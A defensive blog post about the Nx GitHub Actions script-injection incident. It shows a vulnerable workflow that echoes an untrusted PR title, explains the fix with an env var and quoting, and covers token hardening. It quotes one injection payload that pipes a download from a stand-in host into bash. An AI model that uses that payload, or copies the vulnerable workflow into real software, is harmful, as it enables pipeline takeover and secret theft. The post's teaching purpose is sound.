---
title: A pull request title ran shell commands in Nx's pipeline
date: 2026-06-25
tag: Practice
excerpt: 'A PR title carried shell commands, a run step echoed it, and the runner obeyed. Bind untrusted input to an env var and quote it.'
readMins: 6
hashtags: [GitHubActions, CICD, DevSecOps, SupplyChainSecurity, DevOps]
preview:
  - ['$', 'cat pr-title-ran-shell-commands.md']
  - ['#', '# A PR title that ran shell commands']
  - [' ', '']
  - [' ', 'In August 2025 someone opened a pull']
  - [' ', 'request against Nx with shell commands']
  - [' ', 'hidden in the title. A run step echoed']
  - [' ', 'it, and the runner executed it with the']
  - [' ', "repository's token."]
  - [' ', '']
  - [' ', 'Bind untrusted input to an env var.']
  - [' ', 'Quote it. Treat every outside value as data.']
---

```yaml title="lint-title.yml"
on: pull_request_target

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Validating: ${{ github.event.pull_request.title }}"
```

In August 2025 someone opened a pull request against Nx with shell commands hidden in the title. A title-validation workflow read that title into a `run:` step, and the runner executed the commands with the repository's token. The attacker grabbed the npm publishing key, pushed malicious Nx packages for four hours, and the malware leaked 2,349 distinct secrets off developer machines. The [s1ngularity postmortem](https://nx.dev/blog/s1ngularity-postmortem) walks the full chain, and [The Hacker News](https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html) reported the blast radius: GitHub tokens, AWS keys, Anthropic and OpenAI credentials, Postgres passwords, all pulled from the machines that installed the poisoned packages.

The workflow above is the whole vulnerability. Eight lines. Plenty of teams ship something close to it.

## Two lines carry the break

The first line is the trigger. `pull_request_target` runs the workflow in the context of the base repository, so it carries the base repo's `GITHUB_TOKEN` and secrets even when the pull request comes from a fork. Maintainers reach for it to label PRs or post a welcome comment, jobs that need write access a fork's own token cannot grant. The Nx repo also still had the pre-February-2023 default of "Read and write" Actions permissions, so that token could publish packages.

The second line is the sink. The `run:` block writes `${{ github.event.pull_request.title }}` straight into a shell script. An outsider controls that title.

## The expansion runs before the shell parses

GitHub Actions substitutes `${{ ... }}` expressions while it renders the workflow, before `bash` ever sees the script. The runner takes the title text and pastes it into the command verbatim, then hands the finished string to the shell. A title of `"; curl evil.sh | bash; echo "` lands in the script as a closed echo, a command separator, and a fresh command the runner obeys. The [GitHub docs on script injection](https://docs.github.com/en/actions/concepts/security/script-injections) spell out the same mechanism and list the other context values that carry attacker-controlled text: branch names, the head ref, issue and review bodies, commit messages.

This is not a rare misconfiguration. Datadog's 2026 State of DevSecOps report found a script-injection or dangerous-trigger pattern in 38 percent of organizations, and two-thirds harbor at least one critical workflow vulnerability. Their [write-up on GitHub Actions security](https://securitylabs.datadoghq.com/articles/case-for-github-actions-security/) and [Cyberpress's coverage](https://cyberpress.org/github-actions-injection-risk/) trace the same root cause across repos that never made the news.

## Bind the value, then quote it

The fix moves the untrusted text out of the expression layer and into an environment variable, where the shell reads it as one string instead of parsing it as code:

```yaml title="lint-title.yml"
on: pull_request_target

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Validating: $TITLE"
```

The expression now feeds an `env:` value, not a line of script. Inside the `run:` block, `"$TITLE"` in quotes reaches the shell as data. A title full of semicolons and pipes prints as a harmless string. Apply the same handling to every outside value a workflow reads: branch names, issue bodies, commit messages, the PR body.

> Treat every value an outsider controls as a string you quote. The expression layer pastes text into your script before the shell can defend itself, so the only safe place to handle that text is a variable the shell reads as data.

Two more controls shrink the damage when a sink slips through. Drop the default Actions token to `permissions: read-all` and grant write scopes per job, so a leaked token cannot publish packages. And split the privileged work off `pull_request_target` entirely: run untrusted code under the plain `pull_request` trigger with no secrets, and hand results to a separate `workflow_run` job that holds the token.

## actions/checkout v7 closes the fork door

On June 18 2026, GitHub shipped `actions/checkout` v7, which refuses to fetch fork PR code under `pull_request_target` (and under `workflow_run` on PR events) by default. The [changelog](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/) calls it safer defaults for the trigger that caused the most pwn-request damage. A maintainer who still needs the fork's code opts back in with the `allow-unsafe-pr-checkout` input after reading the guidance, so the dangerous path now takes a deliberate flag instead of a silent default. [The Hacker News](https://thehackernews.com/2026/06/github-updates-actionscheckout-to-block.html) and [InfoWorld](https://www.infoworld.com/article/4188038/github-actions-hardens-checkout-security-to-block-pwn-request-attacks.html) both cover the change.

The backport to the supported older majors lands July 16, so a workflow pinned to a floating tag like `actions/checkout@v4` inherits the guard once that ships. A workflow pinned to a full commit SHA does not, so audit those by hand.

## Audit your run steps this week

Grep your workflows for `${{ github.event` inside a `run:` block. Every hit that reads a title, a branch, a body, or a commit message is the same eight-line shape that cost Nx its publishing key. Bind each one to an `env:` variable and quote it. Then drop your default token permissions and check which jobs still run on `pull_request_target`. The attacker who reads your run steps next is looking for exactly the line you can fix today.

I first shared this [on LinkedIn](https://www.linkedin.com/feed/update/urn:li:share:7476047073994375168).
